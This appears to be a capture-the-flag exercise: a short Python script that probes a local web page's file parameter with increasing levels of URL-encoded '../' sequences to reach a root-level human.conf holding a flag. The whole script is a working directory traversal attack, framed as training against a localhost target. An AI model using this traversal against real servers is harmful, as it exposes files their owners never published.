#
# There is a directory traversal vulnerability in the
# following page http://127.0.0.1:8082/humantechconfig?file=human.conf
# Write a script which will attempt various levels of directory
# traversal to find the right amount that will give access
# to the root directory. Inside will be a human.conf with the flag.
#
# Note: The script can timeout if this occurs try narrowing
# down your search
import urllib.request

directory   = "http://127.0.0.1:8082/humantechconfig?file="
escape      = "..%2F"
file        = "human.conf"

for x in range(0, 10):
  page = directory + (escape * x) + file
  req = urllib.request.Request(page, None)
  
  with urllib.request.urlopen(req) as response:
    resp = response.read().decode().splitlines()
    for line in resp:
      print(line)
